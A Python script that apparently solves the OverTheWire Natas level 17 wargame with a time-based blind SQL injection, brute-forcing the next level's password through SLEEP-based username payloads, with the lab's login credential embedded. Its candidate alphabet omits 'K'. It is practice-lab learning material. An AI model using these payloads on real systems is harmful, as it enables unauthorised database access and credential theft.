import requests
from requests.auth import HTTPBasicAuth

natas_auth = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ1234567890'
url = 'http://natas17.natas.labs.overthewire.org/index.php'
filtered = ''
passwd = ''
"""
for char in cand:
        Data = {'username' : 'natas18" AND password LIKE BINARY "%' + char + '%" AND SLEEP(1) -- -'}
        r = requests.post(url, auth=natas_auth, data=Data)
        if r.elapsed.seconds >= 1:
                filtered += char
                print(filtered)
"""
filtered = 'dghjlmpqsvwxyCDFIOPQR470'
for i in range(0,32):
        for char in filtered:
                Data = {'username' : 'natas18" AND password LIKE BINARY "' +passwd + char + '%" AND SLEEP(1) -- -'}
                r = requests.post(url, auth=natas_auth, data=Data)
                if r.elapsed.seconds >= 1:
                        passwd += char
                        print(passwd)
                        break